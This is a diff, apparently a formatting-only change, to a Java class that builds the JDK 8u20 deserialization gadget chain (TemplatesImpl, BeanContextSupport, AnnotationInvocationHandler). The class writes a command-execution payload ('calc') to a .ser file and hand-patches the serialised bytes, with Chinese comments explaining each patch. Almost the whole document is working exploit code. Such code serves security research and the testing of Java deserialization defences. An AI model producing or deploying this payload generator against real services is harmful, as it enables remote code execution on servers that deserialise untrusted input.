@@ -17,15 +17,15 @@ import java.util.LinkedHashSet;
 
 public class Jre8u20 {
     public static void main(String[] args) throws Exception {
-        byte[] bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous = new FileOutputStream("888.ser");
+        byte[]           bytes = getBytes(PayloadType.command, "calc");
+        FileOutputStream fous  = new FileOutputStream("888.ser");
         fous.write(bytes);
         fous.close();
     }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
-        final Object templates = Gadgets.createTemplatesImpl(type, param);
-        String zeroHashCodeStr = "f5a5a608";
+        final Object templates       = Gadgets.createTemplatesImpl(type, param);
+        String       zeroHashCodeStr = "f5a5a608";
 
         HashMap map = new HashMap();
         map.put(zeroHashCodeStr, "foo");
@@ -40,9 +40,9 @@ public class Jre8u20 {
 
         LinkedHashSet set = new LinkedHashSet();
 
-        BeanContextSupport bcs = new BeanContextSupport();
-        Class cc = Class.forName("java.beans.beancontext.BeanContextSupport");
-        Field serializable = cc.getDeclaredField("serializable");
+        BeanContextSupport bcs          = new BeanContextSupport();
+        Class              cc           = Class.forName("java.beans.beancontext.BeanContextSupport");
+        Field              serializable = cc.getDeclaredField("serializable");
         serializable.setAccessible(true);
         serializable.set(bcs, 0);
 
@@ -53,7 +53,7 @@ public class Jre8u20 {
 
         //序列化
         ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baous);
+        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
 
         oos.writeObject(set);
         oos.writeObject(handler);
@@ -67,9 +67,9 @@ public class Jre8u20 {
         //调整 TC_ENDBLOCKDATA 标记的位置
         //0x73 = 115, 0x78 = 120
         //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
-        for(int i = 0; i < bytes.length; i++){
-            if(bytes[i] == 0 && bytes[i+1] == 0 && bytes[i+2] == 0 & bytes[i+3] == 0 &&
-                    bytes[i+4] == 120 && bytes[i+5] == 120 && bytes[i+6] == 115){
+        for (int i = 0; i < bytes.length; i++) {
+            if (bytes[i] == 0 && bytes[i + 1] == 0 && bytes[i + 2] == 0 & bytes[i + 3] == 0 &&
+                    bytes[i + 4] == 120 && bytes[i + 5] == 120 && bytes[i + 6] == 115) {
                 bytes = Util.deleteAt(bytes, i + 5);
                 break;
             }
@@ -79,10 +79,10 @@ public class Jre8u20 {
         //将 serializable 的值修改为 1
         //0x73 = 115, 0x78 = 120
         //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
-        for(int i = 0; i < bytes.length; i++){
-            if(bytes[i] == 120 && bytes[i+1] == 0 && bytes[i+2] == 1 && bytes[i+3] == 0 &&
-                    bytes[i+4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 0 && bytes[i+7] == 115){
-                bytes[i+6] = 1;
+        for (int i = 0; i < bytes.length; i++) {
+            if (bytes[i] == 120 && bytes[i + 1] == 0 && bytes[i + 2] == 1 && bytes[i + 3] == 0 &&
+                    bytes[i + 4] == 0 && bytes[i + 5] == 0 && bytes[i + 6] == 0 && bytes[i + 7] == 115) {
+                bytes[i + 6] = 1;
                 break;
             }
         }
@@ -98,9 +98,9 @@ public class Jre8u20 {
         //目的是让 AnnotationInvocationHandler 变成 BeanContextSupport 的数据流
         //0x77 = 119, 0x78 = 120
         //0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA
-        for(int i = 0; i < bytes.length; i++){
-            if(bytes[i] == 119 && bytes[i+1] == 4 && bytes[i+2] == 0 && bytes[i+3] == 0 &&
-                    bytes[i+4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 120){
+        for (int i = 0; i < bytes.length; i++) {
+            if (bytes[i] == 119 && bytes[i + 1] == 4 && bytes[i + 2] == 0 && bytes[i + 3] == 0 &&
+                    bytes[i + 4] == 0 && bytes[i + 5] == 0 && bytes[i + 6] == 120) {
                 bytes = Util.deleteAt(bytes, i);
                 bytes = Util.deleteAt(bytes, i);
                 bytes = Util.deleteAt(bytes, i);
@@ -125,11 +125,11 @@ public class Jre8u20 {
          */
         //0x78 = 120, 0x70 = 112
         //0x78 for TC_ENDBLOCKDATA, 0x70 for TC_NULL
-        for(int i = 0; i < bytes.length; i++){
-            if(bytes[i] == 0 && bytes[i+1] == 0 && bytes[i+2] == 0 && bytes[i+3] == 0 &&
-                    bytes[i + 4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 0 && bytes[i+7] == 0 &&
-                    bytes[i+8] == 0 && bytes[i+9] == 0 && bytes[i+10] == 0 && bytes[i+11] == 120 &&
-                    bytes[i+12] == 112){
+        for (int i = 0; i < bytes.length; i++) {
+            if (bytes[i] == 0 && bytes[i + 1] == 0 && bytes[i + 2] == 0 && bytes[i + 3] == 0 &&
+                    bytes[i + 4] == 0 && bytes[i + 5] == 0 && bytes[i + 6] == 0 && bytes[i + 7] == 0 &&
+                    bytes[i + 8] == 0 && bytes[i + 9] == 0 && bytes[i + 10] == 0 && bytes[i + 11] == 120 &&
+                    bytes[i + 12] == 112) {
                 i = i + 13;
                 bytes = Util.addAtIndex(bytes, i++, (byte) 0x77);
                 bytes = Util.addAtIndex(bytes, i++, (byte) 0x04);
@@ -148,9 +148,9 @@ public class Jre8u20 {
         // -> count = ois.readInt(); 报错，无法完成整个反序列化流程
         // 没有 SC_WRITE_METHOD 标记，认为这个反序列流到此就结束了
         // 标记： 7375 6e2e 7265 666c 6563 --> sun.reflect...
-        for(int i = 0; i < bytes.length; i++){
-            if(bytes[i] == 115 && bytes[i+1] == 117 && bytes[i+2] == 110 && bytes[i+3] == 46 &&
-                    bytes[i + 4] == 114 && bytes[i+5] == 101 && bytes[i+6] == 102 && bytes[i+7] == 108 ){
+        for (int i = 0; i < bytes.length; i++) {
+            if (bytes[i] == 115 && bytes[i + 1] == 117 && bytes[i + 2] == 110 && bytes[i + 3] == 46 &&
+                    bytes[i + 4] == 114 && bytes[i + 5] == 101 && bytes[i + 6] == 102 && bytes[i + 7] == 108) {
                 i = i + 58;
                 bytes[i] = 3;
                 break;
